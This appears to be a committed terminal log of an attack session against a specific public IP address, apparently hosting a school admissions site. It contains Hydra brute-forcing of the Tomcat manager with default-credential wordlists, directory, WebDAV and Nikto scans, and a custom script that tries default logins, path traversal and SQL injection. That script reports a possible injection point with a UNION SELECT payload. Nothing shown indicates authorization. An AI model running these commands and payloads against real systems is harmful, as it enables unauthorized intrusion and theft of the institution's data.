@@ -1,0 +1,72 @@
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/ResultEscaneos]
+└──╼ $hydra -L /usr/share/wordlists/metasploit/tomcat_mgr_default_users.txt -P /usr/share/wordlists/metasploit/tomcat_mgr_default_pass.txt $TARGET http-get /manager/html
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-28 00:57:52
+[ERROR] Unknown service: /manager/html
+
+┌─[marcos_os@parrot]─[/usr/share/wordlists]
+└──╼ $gobuster dir -u http://189.254.143.102 -w /usr/share/wordlists/dirb/common.txt -x jsp,html,txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://189.254.143.102
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              jsp,html,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+
+Error: error on running gobuster: unable to connect to http://189.254.143.102/: Get "http://189.254.143.102/": dial tcp 189.254.143.102:80: connect: no route to host
+
+┌─[✗]─[marcos_os@parrot]─[/usr/share/wordlists]
+└──╼ $davtest -url http://189.254.143.102/webdav/
+********************************************************
+ Testing DAV connection
+OPEN		FAIL:	http://189.254.143.102/webdav	The URL "http://189.254.143.102/webdav/" is not DAV enabled or not accessible.
+
+──╼ $nikto -h http://189.254.143.102 -C all
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          189.254.143.102
++ Target Hostname:    189.254.143.102
++ Target Port:        80
++ Start Time:         2025-09-28 00:59:11 (GMT-6)
+---------------------------------------------------------------------------
++ Server: Apache-Coyote/1.1
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ Root page / redirects to: https://189.254.143.102/
++ ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can't connect (timeout): Transport endpoint is not connected
++ Scan terminated: 11 error(s) and 2 item(s) reported on remote host
++ End Time:           2025-09-28 01:02:26 (GMT-6) (195 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+=== ESCANEO AVANZADO TOMCAT 6.0 ===
+Objetivo: 189.254.143.102
+
+[1] Probando credenciales Tomcat Manager...
+Error probando admin:admin - HTTPConnectionPool(host='189.254.143.102', port=80): Max retries exceeded with url: /manager/html (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f7a4ed1d310>: Failed to establish a new connection: [Errno 113] No route to host'))
+Error probando tomcat:tomcat - HTTPConnectionPool(host='189.254.143.102', port=80): Max retries exceeded with url: /manager/html (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f7a4ed1edd0>: Failed to establish a new connection: [Errno 113] No route to host'))
+Error probando both:tomcat - HTTPConnectionPool(host='189.254.143.102', port=80): Max retries exceeded with url: /manager/html (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f7a4eca0a10>: Failed to establish a new connection: [Errno 113] No route to host'))
+Error probando tomcat:s3cret - HTTPConnectionPool(host='189.254.143.102', port=80): Max retries exceeded with url: /manager/html (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f7a4ed1fad0>: Failed to establish a new connection: [Errno 113] No route to host'))
+Error probando admin:tomcat - HTTPConnectionPool(host='189.254.143.102', port=80): Max retries exceeded with url: /manager/html (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f7a4eccbd50>: Failed to establish a new connection: [Errno 113] No route to host'))
+
+[2] Probando Path Traversal en cal2.jsp...
+
+[3] Verificando acceso WebDAV...
+
+[4] Escaneando rutas sensibles...
+
+[5] Probando inyecciones SQL...
+[+] POSIBLE SQL INJECTION: https://189.254.143.102/jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=1'
+[+] POSIBLE SQL INJECTION: https://189.254.143.102/jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=1 UNION SELECT 1,2,3--
+
+[-] No se encontraron credenciales válidas
